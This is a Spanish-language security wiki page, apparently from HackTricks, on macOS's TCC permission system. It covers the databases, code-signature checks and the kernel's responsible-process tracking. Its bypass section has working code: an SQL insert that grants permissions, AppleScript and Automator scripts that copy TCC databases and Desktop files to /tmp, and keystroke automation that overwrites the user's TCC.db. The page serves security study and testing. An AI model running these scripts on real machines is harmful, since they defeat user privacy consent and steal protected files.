# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Información básica**

**TCC (Transparency, Consent, and Control)** es un protocolo de seguridad centrado en regular los permisos de las aplicaciones. Su función principal es proteger funciones sensibles como **los servicios de ubicación, los contactos, las fotos, el micrófono, la cámara, la accesibilidad y el acceso completo al disco**. Al exigir el consentimiento explícito del usuario antes de conceder acceso de la aplicación a estos elementos, TCC mejora la privacidad y el control del usuario sobre sus datos.

Los usuarios interactúan con TCC cuando las aplicaciones solicitan acceso a funciones protegidas. Esto se muestra mediante un aviso que permite a los usuarios **aprobar o denegar el acceso**. Además, TCC admite acciones directas del usuario, como **arrastrar y soltar archivos en una aplicación**, para conceder acceso a archivos específicos, garantizando que las aplicaciones solo tengan acceso a aquello que se permite explícitamente.

![Un ejemplo de un aviso de TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** es gestionado por el **daemon** ubicado en `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` y configurado en `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando el servicio mach `com.apple.tccd.system`).

Hay un **tccd en modo usuario** ejecutándose para cada usuario conectado, definido en `/System/Library/LaunchAgents/com.apple.tccd.plist`, que registra los servicios mach `com.apple.tccd` y `com.apple.usernotifications.delegate.com.apple.tccd`.

Aquí puedes ver el tccd ejecutándose como system y como usuario:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Los **permisos** se **heredan de** la aplicación **principal** y los **permisos** se **rastrean** según el **Bundle ID** y el **Developer ID**.

### Bases de datos de TCC

Las concesiones/denegaciones se almacenan en algunas bases de datos de TCC:

- La base de datos de todo el sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Esta base de datos está **protegida por SIP**, por lo que solo un bypass de SIP puede escribir en ella.
- La base de datos de TCC del usuario **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** contiene las preferencias por usuario.
- Esta base de datos está protegida, por lo que solo los procesos con privilegios elevados de TCC, como Full Disk Access, pueden escribir en ella (pero no está protegida por SIP).

> [!WARNING]
> Las bases de datos anteriores también están **protegidas por TCC para el acceso de lectura**. Por lo tanto, **no podrás leer** la base de datos de TCC de tu usuario habitual, a menos que lo hagas desde un proceso con privilegios de TCC.
>
> Sin embargo, recuerda que un proceso con estos privilegios elevados (como **FDA** o **`kTCCServiceEndpointSecurityClient`**) podrá escribir en la base de datos de TCC de los usuarios.

- Existe una **tercera** base de datos de TCC en **`/var/db/locationd/clients.plist`** que indica los clientes autorizados a **acceder a los servicios de ubicación**.
- El archivo protegido por SIP **`/Users/carlospolop/Downloads/REG.db`** (también protegido contra el acceso de lectura mediante TCC) contiene la **ubicación** de todas las **bases de datos de TCC válidas**.
- El archivo protegido por SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (también protegido contra el acceso de lectura mediante TCC) contiene más permisos concedidos por TCC.
- El archivo protegido por SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (pero legible por cualquiera) es una lista de aplicaciones permitidas que requieren una excepción de TCC.

> [!TIP]
> La base de datos de TCC en **iOS** se encuentra en **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> La **interfaz de usuario del notification center** puede realizar **cambios en la base de datos de TCC del sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Sin embargo, los usuarios pueden **eliminar o consultar reglas** con la utilidad de línea de comandos **`tccutil`**.

#### Consultar las bases de datos

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Consultando ambas bases de datos puedes comprobar los permisos que una aplicación ha permitido, ha denegado o no tiene (los solicitará).

- **`service`** es la representación en forma de cadena del **permiso** TCC
- **`client`** es el **bundle ID** o la **ruta al binario** que tiene los permisos
- **`client_type`** indica si se trata de un Bundle Identifier(0) o de una ruta absoluta(1)

<details>

<summary>Cómo ejecutarlo si es una ruta absoluta</summary>

Simplemente ejecuta **`launctl load you_bin.plist`**, con un plist como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** puede tener distintos valores: denegado(0), desconocido(1), permitido(2) o limitado(3).
- **`auth_reason`** puede tener los siguientes valores: Error(1), Consentimiento del usuario(2), Configurado por el usuario(3), Configurado por el sistema(4), Política del servicio(5), Política de MDM(6), Política de override(7), Falta la cadena de uso(8), Tiempo de espera de la solicitud agotado(9), Preflight desconocido(10), Concedido(11), Política del tipo de aplicación(12).
- El campo **`csreq`** indica cómo verificar el binario que se ejecutará y concederle los permisos de TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Para obtener más información sobre los **otros campos** de la tabla, [**consulta esta publicación del blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

También puedes consultar los permisos **ya concedidos** a las aplicaciones en `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Los usuarios _pueden_ **eliminar o consultar reglas** mediante **`tccutil`**.

#### Restablecer los permisos de TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Comprobaciones de firma de TCC

La **base de datos** de TCC almacena el **Bundle ID** de la aplicación, pero también **almacena** **información** sobre la **firma** para **asegurarse** de que la **aplicación** que solicita usar el permiso sea la correcta.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Por lo tanto, otras aplicaciones que utilicen el mismo nombre y bundle ID no podrán acceder a los permisos concedidos a otras apps.

### Entitlements & TCC Permissions

Las apps **no solo necesitan** **solicitar y obtener acceso concedido** a algunos recursos, sino que también necesitan **tener los entitlements relevantes**.\
Por ejemplo, **Telegram** tiene el entitlement `com.apple.security.device.camera` para solicitar **acceso a la cámara**. Una **app** que **no tenga** este **entitlement no podrá** acceder a la cámara (y ni siquiera se preguntará al usuario por los permisos).

Ten en cuenta que los entitlements son archivos plist y forman parte de code sig, además de tener un hash adicional en code sig mediante slots especiales; el código del kernel puede consultarlos en el kernel, o el código del modelo de usuario puede hacerlo mediante `csops(#169)` o `csops_audittoken(#170)`.

Sin embargo, para que las apps puedan **acceder** a **ciertas carpetas del usuario**, como `~/Desktop`, `~/Downloads` y `~/Documents`, **no necesitan** tener ningún **entitlement** específico. El sistema gestionará el acceso de forma transparente y **solicitará confirmación al usuario** cuando sea necesario.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Las apps de Apple **no generarán prompts**. Contienen **derechos preconcedidos** en su lista de **entitlements**, lo que significa que **nunca generarán un popup**, **ni** aparecerán en ninguna de las **bases de datos de TCC**. Por ejemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Esto evitará que Calendar solicite al usuario acceso a reminders, calendar y la address book.

> [!TIP]
> Además de cierta documentación oficial sobre entitlements, también es posible encontrar **información interesante no oficial sobre entitlements en** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Algunos permisos de TCC son: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... No existe ninguna lista pública que defina todos, pero puedes consultar esta [**lista de permisos conocidos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Lugares sensibles no protegidos

- $HOME (el propio directorio)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### Intención del usuario / com.apple.macl

Como se mencionó anteriormente, es posible **conceder acceso de una App a un archivo arrastrándolo\&soltándolo sobre ella**. Este acceso no se especificará en ninguna base de datos de TCC, sino como un **atributo** **extendido del archivo**. Este atributo **almacenará el UUID** de la App permitida:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Es curioso que el atributo **`com.apple.macl`** sea gestionado por el **Sandbox**, no por tccd.
>
> Ten en cuenta también que, si mueves a otro equipo un archivo que permite el UUID de una app en tu ordenador, como la misma app tendrá UIDs diferentes, no concederá acceso a esa app.

El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como se [**explica en este post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.<sup>[[3]](#references)</sup>






## Mecanismo de proceso responsable de XNU

En macOS/iOS, el mecanismo de **proceso responsable** es una función de seguridad crítica utilizada por el framework **TCC (Transparency, Consent, and Control)** y otros sistemas de seguridad para rastrear qué proceso es el responsable final de una acción, incluso a través de cadenas de procesos hijo.

Cuando TCC comprueba permisos (por ejemplo, para la cámara, el micrófono o la ubicación), no siempre comprueba el proceso inmediato que realiza la solicitud. En su lugar, comprueba el **proceso responsable**: normalmente, la aplicación GUI que inició la acción, aunque la solicitud real provenga de un proceso auxiliar o daemon.

<details>
<summary>Cómo se establece el proceso responsable</summary>

### Campos de la estructura del proceso

Cada proceso en XNU mantiene dos identificadores UUID principales:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: El UUID propio del proceso (del comando de carga `LC_UUID` de su binario Mach-O)
- **`p_responsible_pid`**: El PID del proceso responsable
- **`p_responsible_uuid`**: El UUID del proceso responsable (persiste incluso después de que dicho proceso termina)

### Cómo se establece el proceso responsable

1. **Durante la creación del proceso (Fork)**

Cuando se crea un proceso nuevo mediante `fork()` o `posix_spawn()`, el proceso responsable se hereda del proceso padre (la llamada al sistema `exec()` reutiliza la estructura `proc` existente, por lo que este paso no se repite allí):

**Ubicación**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Puntos clave:**
- Los procesos secundarios **heredan** el `p_responsible_pid` del proceso principal
- Esto crea una **cadena de responsabilidad** a través de la jerarquía de procesos
- El proceso responsable normalmente apunta a la aplicación GUI original

2. **La función principal: `proc_set_responsible_pid()`**

**Ubicación**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Qué hace esta función:**
1. **Establece el PID responsable** en el proceso objetivo
2. **Busca el proceso responsable** mediante `proc_find()` (incrementa el contador de referencias)
3. **Copia el UUID** de `p_uuid` del proceso responsable a `p_responsible_uuid` del proceso objetivo
4. **Libera la referencia** con `proc_rele()` (disminuye el contador de referencias)

3. **¿Por qué almacenar tanto el PID como el UUID?**

El enfoque de almacenamiento dual resuelve un problema crítico:

| Campo | Propósito | Problema | Solución |
|-------|---------|---------|----------|
| `p_responsible_pid` | Búsqueda rápida del proceso actual | El PID puede reutilizarse después de que el proceso finaliza | Se utiliza para buscar el proceso activo |
| `p_responsible_uuid` | Identificación persistente | Sobrevive a la finalización del proceso | Se utiliza para comprobaciones de seguridad y auditoría |

**El problema**: Si el proceso responsable finaliza antes que el proceso hijo, el PID podría reciclarse y asignarse a un proceso completamente diferente.

**La solución**: El UUID es inmutable e identifica de forma única el binario específico que era responsable, incluso después de que finalice.

### Flujo de creación del proceso
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Fuente del UUID: comando de carga LC_UUID

El UUID almacenado en `p_uuid` proviene del **comando de carga `LC_UUID` del ejecutable Mach-O**:

1. **Tiempo de compilación**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Tiempo de ejecución**

**Ubicación**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Almacenado en la estructura del proceso**

**Ubicación**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Ubicación**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc y Bypasses

### Insertar en TCC

Si en algún momento consigues acceso de escritura a una base de datos de TCC, puedes usar algo como lo siguiente para añadir una entrada (elimina los comentarios):

<details>

<summary>Ejemplo de inserción en TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Si lograste entrar en una app con algunos permisos de TCC, consulta la siguiente página con TCC payloads para abusar de ellos:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Obtén más información sobre Apple Events en:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

El nombre de TCC del permiso de Automation es: **`kTCCServiceAppleEvents`**\
Este permiso específico de TCC también indica la **aplicación que se puede administrar** dentro de la base de datos de TCC (por lo que el permiso no permite administrar todo).

**Finder** es una aplicación que **siempre tiene FDA** (aunque no aparezca en la UI), por lo que, si tienes privilegios de **Automation** sobre ella, puedes abusar de sus privilegios para **hacer que realice algunas acciones**.\
En este caso, tu app necesitaría el permiso **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Podrías abusar de esto para **escribir tu propia base de datos TCC de usuario**.

> [!WARNING]
> Con este permiso podrás **pedirle a Finder que acceda a carpetas restringidas por TCC** y que te entregue los archivos, pero que yo sepa **no podrás hacer que Finder ejecute código arbitrario** para abusar completamente de su acceso FDA.
>
> Por lo tanto, no podrás abusar de todas las capacidades de FDA.

Este es el aviso de TCC para obtener privilegios de Automation sobre Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Ten en cuenta que, como la aplicación **Automator** tiene el permiso TCC **`kTCCServiceAppleEvents`**, puede **controlar cualquier aplicación**, como Finder. Por lo tanto, al tener permiso para controlar Automator también podrías controlar **Finder** con un código como el siguiente:

<details>

<summary>Obtener un shell dentro de Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Lo mismo sucede con la **app Script Editor,** puede controlar Finder, pero mediante un AppleScript no puedes obligarla a ejecutar un script.

### Automatización (SE) a algunos TCC

**System Events puede crear Folder Actions, y las Folder Actions pueden acceder a algunas carpetas TCC** (Desktop, Documents y Downloads), por lo que se puede usar un script como el siguiente para abusar de este comportamiento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

Automation on **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) permite enviar **pulsaciones de teclas a procesos**. De esta forma, podrías abusar de Finder para modificar el TCC.db del usuario o conceder FDA a una aplicación arbitraria (aunque podría solicitarse la contraseña para ello).

Ejemplo de Finder sobrescribiendo el TCC.db del usuario:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` a FDA\*

Consulta esta página para ver algunos [**payloads para abusar de los permisos de Accessibility**](macos-tcc-payloads.md#accessibility) y hacer privesc a FDA\* o ejecutar un keylogger, por ejemplo.

### **Endpoint Security Client a FDA**

Si tienes **`kTCCServiceEndpointSecurityClient`**, tienes FDA. Fin.

### System Policy SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **cambiar** el atributo **`NFSHomeDirectory`** de un usuario, lo que cambia su carpeta de inicio y, por tanto, permite **bypassear TCC**.<sup>[[5]](#references)</sup>

### User TCC DB a FDA

Obtener **permisos de escritura** sobre la base de datos **TCC del usuario** **no** te permite concederte permisos de **`FDA`**; solo la base de datos del sistema puede concederlos.

Pero sí puedes concederte **permisos de Automation para Finder** y abusar de la técnica anterior para escalar a FDA\*.

### **FDA a permisos de TCC**

**Full Disk Access** es el nombre de TCC **`kTCCServiceSystemPolicyAllFiles`**

No creo que esto sea un privesc real, pero por si acaso te resulta útil: si controlas un programa con FDA, puedes **modificar la base de datos TCC de los usuarios y concederte cualquier acceso**. Esto puede ser útil como técnica de persistencia por si pierdes tus permisos de FDA.

### **SIP Bypass a TCC Bypass**

La **base de datos TCC** del sistema está protegida por **SIP**; por eso, solo los procesos con los **entitlements indicados podrán modificarla**. Por tanto, si un atacante encuentra un **SIP bypass** sobre un **archivo** (puede modificar un archivo restringido por SIP), podrá:

- **Eliminar la protección** de una base de datos TCC y concederse todos los permisos de TCC. Podría abusar de cualquiera de estos archivos, por ejemplo:
- La base de datos TCC del sistema
- REG.db
- MDMOverrides.plist

Sin embargo, existe otra opción para abusar de este **SIP bypass para bypassear TCC**: el archivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` es una allow list de aplicaciones que requieren una excepción de TCC. Por tanto, si un atacante puede **eliminar la protección SIP** de este archivo y añadir su **propia aplicación**, la aplicación podrá bypassear TCC.\
Por ejemplo, para añadir Terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [Un análisis profundo de macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script para realizar un seguimiento de com.apple.macl (Gist de brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Seguir y abordar com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Cómo eludir accidentalmente y deliberadamente las protecciones de privacidad de usuario de macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Cambiar el directorio de inicio y eludir TCC, también conocido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
